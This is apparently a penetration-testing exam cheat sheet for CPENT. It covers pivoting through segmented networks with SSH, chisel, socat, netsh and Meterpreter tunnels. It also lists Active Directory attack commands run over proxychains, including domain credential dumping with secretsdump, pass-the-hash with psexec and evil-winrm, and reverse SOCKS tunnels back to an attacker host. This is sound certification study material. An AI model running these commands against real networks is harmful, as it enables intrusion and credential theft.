# Pivot core — CPENT segmentation doctrine + commands

Distilled from the RedBlock v2 field guide (see review_notes/redblock-fieldguide-ref.md)
+ prior attempt + ctf-pivoting pack. CPENT's defining difficulty is segmented
ranges: this file is the always-loaded core; `ctf-pivoting` supplies depth.

## Doctrine (memorize — these win/lose the exam)

1. **Web/IoT edge hosts are dual-homed into the AD range.** Intended path:
   exploit the edge → pivot → own the domain. On EVERY shell, run `ip a` /
   `ipconfig /all; route print; arp -a; cat /etc/hosts` — the second NIC is
   the door to the next range. Maintain a live "host → segments" map.
2. **nmap over SOCKS:** `-sT -Pn` only (SYN scans + host discovery never
   traverse proxychains). A dead-looking segment over a pivot = this mistake.
3. **Callbacks stay in-segment:** set LHOST to the pivot's INTERNAL NIC, use
   a bind payload, or remote-forward your handler inward. Reverse shells to
   your external IP will not route from deep segments.
4. **Reverse SOCKS beats local servers** through egress-filtered ranges.
5. **Test every tunnel with one known port** (`proxychains curl http://<host>`)
   before any big scan.
6. Keep a per-host notes block: interfaces / services / findings / access /
   creds / pivot / evidence.

## Forwarder toolbox (pick by what the pivot offers)

| Situation | Tool | Command |
|---|---|---|
| SSH on pivot | dynamic SOCKS | `ssh -fN -D 1080 u@pivot` → proxychains everything |
| SSH on pivot | single ports | `ssh -L 4445:inner:445 -L 33389:inner:3389 u@pivot` |
| Pivot can reach you, not vice-versa | remote forward | `ssh -R 4444:127.0.0.1:4444 u@pivot` (catch deep shells) |
| SSH both hops | ProxyJump chain | `ssh -J u@pivot1 u@pivot2` then `-D 1081` for SOCKS #2 |
| No SSH, egress OK | chisel reverse SOCKS | attacker: `chisel server -p 443 --reverse`; pivot: `chisel client <you>:443 R:socks` |
| No SSH, single port | chisel | `chisel client <you>:443 R:445:inner:445` |
| Windows pivot (local admin) | netsh portproxy | `netsh interface portproxy add v4tov4 listenport=8888 connectaddress=<inner> connectport=80` |
| Quick TCP/UDP relay | socat | `socat TCP-LISTEN:80,fork TCP:inner:80` / UDP-RECVFROM:161,fork UDP-SENDTO:inner:161 |
| Meterpreter session | autoroute + SOCKS | `run post/multi/manage/autoroute` → `use auxiliary/server/socks_proxy` |

## Double pivot (tier-3 reachable only through tier-2)

- **Meterpreter route:** autoroute tier-2 via session 1 → exploit the
  dual-homed tier-2 host → session 2 → `run autoroute -s <tier3-cidr>` →
  refresh socks_proxy → proxychains reaches tier-3.
- **Chisel chain:** second reverse-SOCKS from PIVOT-2 back THROUGH the first
  tunnel; proxychains `dynamic_chain` with both SOCKS entries (1080, 1081).
- **SSH chain:** `ssh -J u@p1 u@p2 -D 1081`.
- Reflex: foothold → find next NIC/subnet → route/SOCKS through this hop →
  enumerate new segment → compromise dual-homed host in it → repeat.

## proxychains config (exam copy-paste)

```text
dynamic_chain        # skip dead proxies — right mode for chained SOCKS
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081   # second hop when double-pivoting
```

## AD over the pivot (the money commands)

```bash
proxychains nxc smb <inner-cidr> -u u -p 'pw'
proxychains nmap -sT -Pn -p 88,389,445 <dc>
proxychains bloodhound-python -u u -p 'pw' -d dom -c all -ns <dc>
proxychains impacket-secretsdump dom/u:pw@<dc> -just-dc
proxychains impacket-psexec -hashes :<nt> dom/admin@<inner-host>
proxychains evil-winrm -i <inner> -u u -H <nt>
proxychains xfreerdp /v:<inner> /u:u /p:'pw'    # GUI through SOCKS when needed
```

## Practice: labs.md Lab 3 (docker double pivot) — goal 10 minutes end-to-end.
